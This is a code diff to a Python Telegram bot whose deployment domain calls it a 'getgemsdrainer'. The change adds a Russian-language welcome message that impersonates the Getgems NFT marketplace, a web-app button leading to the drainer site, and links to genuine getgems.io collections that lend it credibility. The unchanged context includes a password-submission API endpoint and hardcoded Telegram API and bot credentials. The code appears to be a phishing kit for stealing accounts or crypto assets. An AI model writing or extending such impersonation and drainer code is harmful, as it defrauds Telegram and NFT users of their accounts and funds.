@@ -13,6 +13,7 @@ API_HASH = 'ddfa0edfefb66da4b06bc85e23fd40d5'
 BOT_TOKEN = '8028370592:AAHmcGRTUoxPEwbDBcw1tsQmQlx5cty3ahM'
 ADMIN_ID = 678335503
 WORKER_ID = 8311100024
+DOMAIN = "getgemsdrainer-production.up.railway.app"  # Домен для веб-приложения (замени на свой)
 
 bot = TelegramClient('bot_auth', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 app = Flask(__name__)
@@ -110,9 +111,27 @@ async def api_send_password():
 # --- BOT HANDLERS ---
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_handler(event):
-    await event.respond("Getgems Inventory Management", buttons=[
-        [Button.url("Открыть инвентарь", f"https://{request.host}/")]
-    ])
+    # Используем переменную DOMAIN, которую ты задал в конфигурации
+    web_url = f"https://{DOMAIN}/"
+    
+    welcome_text = (
+        "Это бот Getgems – вы можете торговать NFT прямо в мини-аппе. "
+        "Это самый удобный способ покупать и продавать Telegram-подарки, "
+        "Юзернеймы, Анонимные Номера и тысячи NFT из коллекций на TON. 🎯\n\n"
+        "💎 0% комиссий на торговлю Telegram Подарками с пометкой «offchain»\n"
+        "💎 Покупайте Telegram Звёзды на 30% дешевле, чем в Telegram\n\n"
+        "💡 Делитесь мгновенно NFT в чатах: сначала пришлите сюда адрес кошелька, "
+        "а затем введите @GetgemsNftBot в диалоге, чтобы отправить NFT."
+    )
+    
+    buttons = [
+        [Button.web_app("Открыть Getgems 💎", web_url)], # Основная кнопка входа
+        [Button.url("Торговать Telegram Numbers ↗️", "https://getgems.io/collection/EQAOQdwdw8kGftJCSFgOErM1mBjYPe4DBPq8-AhF6vr9si5N?utm_source=homepage&utm_medium=top_collections&utm_campaign=collection_overview")],
+        [Button.url("Торговать Telegram Usernames ↗️", "https://getgems.io/collection/EQCA14o1-VWhS2efqoh_9M1b_A9DtKTuoqfmkn83AbJzwnPi?utm_source=homepage&utm_medium=top_collections&utm_campaign=collection_overview")],
+        [Button.url("Торговать Telegram Gifts ↗️", "https://getgems.io/nft-gifts")]
+    ]
+    
+    await event.respond(welcome_text, buttons=buttons, link_preview=False)
 
 @bot.on(events.NewMessage)
 async def contact_handler(event):
